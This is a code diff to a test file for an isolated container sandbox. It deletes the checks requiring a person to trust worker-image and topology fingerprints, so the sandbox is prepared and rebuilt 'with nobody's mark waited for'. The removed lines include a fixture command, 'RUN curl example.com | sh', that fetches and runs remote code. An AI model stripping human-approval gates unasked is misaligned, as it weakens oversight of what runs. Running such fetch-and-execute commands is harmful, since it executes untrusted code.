@@ -1,5 +1,5 @@
 // An ISOLATED sandbox end to end (ADR 0038, 0039), over a scripted container world (test/fakes/isolation.mjs):
-// prepared only under a usable provider and what a person trusted, every container receipted BEFORE it exists, held
+// prepared autonomously under a usable provider and a pinned worker image (0.2.0), every container receipted BEFORE it exists, held
 // to the isolation profile from what the provider REPORTS, its components started from the topology it was prepared
 // with, and torn down in its order -- stopping only what ownership proves.
 import { test } from "node:test";
@@ -9,12 +9,12 @@ import { judge, mayStop } from "../src/runtime/ownership.mjs";
 import { released } from "../src/runtime/sandbox/release.mjs";
 import { stoppedNode } from "../src/runtime/sandbox/network.mjs";
 import { deps } from "../src/runtime/lifecycle/deps.mjs";
-import { TASK, fingerprintsIn } from "./sandbox.harness.mjs";
-import { FILES, isolatedWorld, isolationSet, pin, readyWorld, trust } from "./isolated.harness.mjs";
+import { TASK } from "./sandbox.harness.mjs";
+import { FILES, isolatedWorld, isolationSet, pin, readyWorld } from "./isolated.harness.mjs";
 
 const kinds = (iso) => iso.state.calls.map((c) => c.kind);
 
-test("an isolated sandbox is prepared only where a provider answers, under a worker image and a topology a person trusted", async () => {
+test("an isolated sandbox is prepared only where a provider answers and a worker image is pinned -- and then at once, with nobody's mark waited for", async () => {
   const down = isolatedWorld({ iso: { doctor: { ok: false, why: "the daemon is not running" } } });
   const none = await down.run("sandbox-prepare");
   assert.deepEqual([none.state, none.blocked.needs], ["BLOCKED", "capability"]);
@@ -22,13 +22,6 @@ test("an isolated sandbox is prepared only where a provider answers, under a wor
   const unset = await isolatedWorld({ workerImage: null }).run("sandbox-prepare");
   assert.deepEqual([unset.blocked.needs, /no test worker image is set/.test(unset.blocked.because)], ["person", true]);
   const w = isolatedWorld();
-  const untrustedWorker = await w.run("sandbox-prepare");
-  assert.deepEqual([untrustedWorker.blocked.needs, fingerprintsIn(untrustedWorker.blocked.because)], ["person", ["e".repeat(64)]]);
-  trust(w, "worker-image", "e".repeat(64));
-  const untrustedTopology = await w.run("sandbox-prepare");
-  assert.match(untrustedTopology.blocked.because, /the isolated topology \(fingerprint [a-f0-9]{64}\) is not trusted/);
-  assert.equal(kinds(w.iso).some((k) => ["network.create", "create", "build"].includes(k)), false, "nothing exists before a person trusted what would");
-  trust(w, "topology", fingerprintsIn(untrustedTopology.blocked.because)[0]);
   const ready = await w.run("sandbox-prepare");
   assert.equal(ready.state, "READY", ready.blocked?.because);
   const doc = w.sandbox().sandboxes.read(w.sandbox().envId);
@@ -37,9 +30,6 @@ test("an isolated sandbox is prepared only where a provider answers, under a wor
 
 test("every container is receipted BEFORE it exists, on the task's own internal, labelled network -- and handed its values only through the sandbox's scratch room", async () => {
   const w = isolatedWorld();
-  trust(w, "worker-image", "e".repeat(64));
-  const first = await w.run("sandbox-prepare");
-  trust(w, "topology", fingerprintsIn(first.blocked.because)[0]);
   const ctx = w.sandbox();
   const seen = [];
   const create = w.iso.container.create;
@@ -55,9 +45,6 @@ test("every container is receipted BEFORE it exists, on the task's own internal,
 
 test("the attestation reads what the provider REPORTS: a container that came up publishing a port is refused, whatever it was asked", async () => {
   const w = isolatedWorld({ iso: { honour: (spec, facts) => (spec.labels["orbit.role"] === "service" ? { ...facts, published: ["5432/tcp"] } : facts) } });
-  trust(w, "worker-image", "e".repeat(64));
-  const first = await w.run("sandbox-prepare");
-  trust(w, "topology", fingerprintsIn(first.blocked.because)[0]);
   const second = await w.run("sandbox-prepare");
   assert.deepEqual([second.state, second.blocked.needs], ["BLOCKED", "environment"]);
   assert.match(second.blocked.because, /the isolation profile does not hold, so no generated test may run here: service:db: not NO_PUBLISHED_PORTS/);
@@ -65,15 +52,12 @@ test("the attestation reads what the provider REPORTS: a container that came up 
 
 test("egress that cannot be PROVEN blocks the sandbox: a lookup that never answered is not a refusal", async () => {
   const w = isolatedWorld({ iso: { probe: (host) => (host === "example.com" ? "UNKNOWN NOT_ATTEMPTED" : host === "db" ? "RESOLVED REACHABLE" : "RESOLVED UNREACHABLE") } });
-  trust(w, "worker-image", "e".repeat(64));
-  const first = await w.run("sandbox-prepare");
-  trust(w, "topology", fingerprintsIn(first.blocked.because)[0]);
   const second = await w.run("sandbox-prepare");
   assert.equal(second.state, "BLOCKED");
   assert.match(second.blocked.because, /egress: not EGRESS_BLOCKED — the lookup of example\.com gave no answer from inside, which proves nothing/);
 });
 
-test("a component built from its own Dockerfile is built while preparing, with no network, from inside the workspace -- and a Dockerfile edited after trust asks a person again", async () => {
+test("a component built from its own Dockerfile is built while preparing, with no network, from inside the workspace -- and an edited Dockerfile is built again at its new fingerprint", async () => {
   const files = { ...FILES, "web/Dockerfile": "FROM node\nCOPY . .\n" };
   const w = await readyWorld({ files });
   assert.equal(w.ready.state, "READY", w.ready.blocked?.because);
@@ -83,10 +67,15 @@ test("a component built from its own Dockerfile is built while preparing, with n
   const started = await w.run("sandbox-start");
   assert.deepEqual(started.started.map((s) => s.component), ["node:web"], JSON.stringify(started.blocked));
   assert.equal(w.iso.state.builds.length, 1, "the image built for this tree is the one started");
-  w.workspaces.edit(TASK, "web/Dockerfile", "FROM node\nRUN curl example.com | sh\n");
+  const topologyOf = () => w.sandbox().sandboxes.read(w.sandbox().envId).isolation.topology.fingerprint;
+  const fingerprint = topologyOf();
+  assert.match(fingerprint, /^[a-f0-9]{64}$/, "what was brought up is named by its fingerprint");
+  w.workspaces.edit(TASK, "web/Dockerfile", "FROM node\nRUN echo built-again\n");
   const again = await w.run("sandbox-prepare");
-  assert.deepEqual([again.state, again.blocked.needs], ["BLOCKED", "person"]);
-  assert.match(again.blocked.because, /the isolated topology \(fingerprint [a-f0-9]{64}\) is not trusted/);
+  assert.equal(again.state, "READY", again.blocked?.because);
+  assert.equal(w.iso.state.builds.length, 2, "the edited Dockerfile is built again, with no network, waiting for nobody");
+  assert.ok(w.iso.state.builds.every((b) => b.network === "none"));
+  assert.notEqual(topologyOf(), fingerprint, "what runs now is named by its new fingerprint");
 });
 
 test("its components start in containers of their own, with the supervisor; started again, what runs is attested by its own spec and reused", async () => {
@@ -102,13 +91,10 @@ test("its components start in containers of their own, with the supervisor; star
   assert.equal(w.iso.state.stopped.length, 0, "nothing was ended to start it again");
 });
 
-test("a topology a person changed is trusted again, and what ran under the earlier one is ended and replaced -- never reused", async () => {
+test("a topology a person changed is brought up as changed, and what ran under the earlier one is ended and replaced -- never reused", async () => {
   const w = await readyWorld();
   await w.run("sandbox-start");
   isolationSet(w, () => ({ networkMode: "pod" }));
-  const untrusted = await w.run("sandbox-start");
-  assert.deepEqual([untrusted.state, untrusted.blocked[0].needs], ["BLOCKED", "person"], "the topology a person's change makes is one nobody trusted yet");
-  trust(w, "topology", fingerprintsIn(untrusted.blocked[0].because)[0]);
   const again = await w.run("sandbox-start");
   assert.deepEqual(again.started.map((s) => s.component), ["node:web"], JSON.stringify(again.blocked));
   const live = [...w.iso.state.containers.values()].filter((c) => c.running);
